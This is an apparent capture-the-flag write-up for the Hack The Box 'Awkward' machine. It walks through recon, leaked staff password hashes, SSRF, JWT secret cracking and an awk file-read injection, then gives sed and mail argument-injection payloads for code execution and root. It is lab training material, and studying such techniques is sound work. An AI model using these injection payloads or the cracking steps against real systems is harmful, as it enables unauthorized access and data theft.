Initial Nmap Scan

```bash
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Accessing port 80 through browser site will redirect to this hostname

baseurl
```bash
http://hat-valley.htb
```
Fuzzing subdomain
```bash
#subdomain
http://store.hat-valley.htb
```
found endpoints from 
```bash
http://hat-valley.htb/js/app.js
```
endpoints

```bash
http://hat-valley.htb/hr
http://hat-valley.htb/dashboard
http://hat-valley.htb/leave
```
api endpoints
```bash
http://hat-valley.htb/api/
http://hat-valley.htb/api/all-leave {Need Auth}
http://hat-valley.htb/submit-leave {reason,start,end} {Need Auth}
http://hat-valley.htb/api/login   {username,password}
http://hat-valley.htb/api/staff-details {No need of auth}
http://hat-valley.htb/api/store-status {url:"value"} {No need of auth}
```

Names from Teams
```bash
jackson Lightheart
bean Hill
christine Wool {CEO}
christopher Jones
```
Login
```bash
http://store.hat-valley.htb {basic Auth}
http://hat-valley.htb/hr   {"username":"password"}
```

This endpoint is vulnerable for access control we don't need any token for getting these data
http://hat-valley.htb/api/staff-details

Found username and it's passwords
```bash
christine.wool:6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649
christopher.jones:e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1
jackson.lightheart:b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436
bean.hill:37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f
```

One hash is crackable
cracked password
```bash
christopher.jones:e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1:chris123
```

SSRF from store-status endpoint and found the backend server listening port 3002 and the response show some api documention
http://hat-valley.htb/api/store-status?url="http://localhost:3002"

Api documentation 
patached.html

Reading the documentation i found a file read in all-leave endpoint
http://hat-valley.htb/api/all-leave   
Abusing "awk"   
This endpoint is used to fetch user leave requests and the endpoint need user token to fetch the details
the mechanisam behind the fetching user details it use awk command (linux command) for getting data from leave requests stored file that is a csv file on target. server will extract username from user token and getting that particuler user data from csv file using awk. we need to foreging the cookie for injecting filename in username feild of the token

```bash
#bruteforceing the cookie using john and jwt2john tool 
jwt secret = 123beany123
```
rawCommand
```bash
awk '/user/' leave_requests.csv
```

abusedCommand
```bash
awk '//' /etc/passwd '/' leave_reve_requests.csv
```

FOOTHOLD

I write a python script for reading file from target

Machine users
```bash
bean:x:1001:1001:,,,:/home/bean:/bin/bash
christine:x:1002:1002:,,,:/home/christine:/bin/bash
```

Machine user bean password from home_backup tar file
```bash
bean:014mrbeanrules!#P
```
user to www-data

exploiting sed system command on store.hat-valley.htb

payload
```bash
/' -e '1e /dev/shm/rce.sh' '
```
it work like this
```javascript
{sed -i '/item_id=/' -e '1e /dev/shm/rce.sh' '/d' /var/www/store/cart/randomuser-id}
````

I write a script for getting www-data shell

Privilege escalation through mail command
```bash
#payload
; --exec='!/dev/shm/cmd.sh',pe,pe,pe,pe
```

#scripts are i used for this machine will also upload the awkward directory
